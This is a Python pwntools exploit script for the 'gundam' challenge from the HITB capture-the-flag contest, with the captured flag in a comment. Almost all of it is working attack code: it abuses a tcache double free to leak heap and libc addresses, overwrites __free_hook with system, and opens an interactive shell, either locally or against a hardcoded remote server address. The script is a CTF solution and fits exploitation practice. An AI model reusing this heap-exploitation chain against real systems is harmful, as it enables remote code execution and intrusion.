#HITB{now_you_know_about_tcache}
from pwn import *

debug=1
context.log_level='debug'
e=ELF('./libc.so.6')
if debug:
    p=process('gundam',env={'LD_PRELOAD':'./libc.so.6'})
#    gdb.attach(p)
else:
    p=remote('47.75.37.114', 9999)

def build(name,tp):
    p.send('1\n')
    p.recvuntil('The name of gundam :')
    p.send(name)
    p.recvuntil('The type of the gundam :')
    p.send(str(tp)+'\n')
    p.recvuntil('choice : ')

def visit():
    p.send('2\n')
    data=p.recvuntil('1 . ')
    p.recvuntil('choice : ')
    return data

def destory(idx,wait=True):
    p.send('3\n')
    p.recvuntil('Which gundam do you want to Destory:')
    p.send(str(idx)+'\n')
    if wait:
        p.recvuntil('choice : ')

def blow_up():
    p.send('4\n')
    p.recvuntil('choice : ')

def pwnit():
    for i in range(9):
        build('a',1)
    for i in range(8):
        destory(i)#free 8 * 0x100 chunk
    blow_up()#free 9 * 0x28
    build('a',1)# 0x28-fastbin 0x300-tcache     #0

    for i in range(3):
        build('a',1) #3*28 - tcache 3*0x300-tcache   #1 2 3

    data=visit()
    t1=data.index("[0] :")+5
    heap=u64(data[t1:t1+6]+'\x00\x00')-0x861

    heap_libc=heap+0xb50

    destory(0) #0x300 tcache
    destory(0)  #double free  #0x300 tcache

    build(p64(heap_libc),1) #4
    build('a',1) #5
    build('a',1) #6 point to heap_libc


    data=visit()
    t2=data.index("[6] :")+5
    libc=u64(data[t2:t2+6]+'\x00\x00')

    base=libc-0x3DAC61

    free_hook=base+e.symbols['__free_hook']
    system=base+e.symbols['system']

#    print(hex(heap))
#    print(hex(bap.send))

    destory(2)
    blow_up()

    destory(1)
    destory(1)

    build(p64(free_hook),1)#0
    build('/bin/sh',1)#1
    build(p64(system),1)#2

    destory(0,False)

    p.interactive()

if __name__ == "__main__":
    pwnit()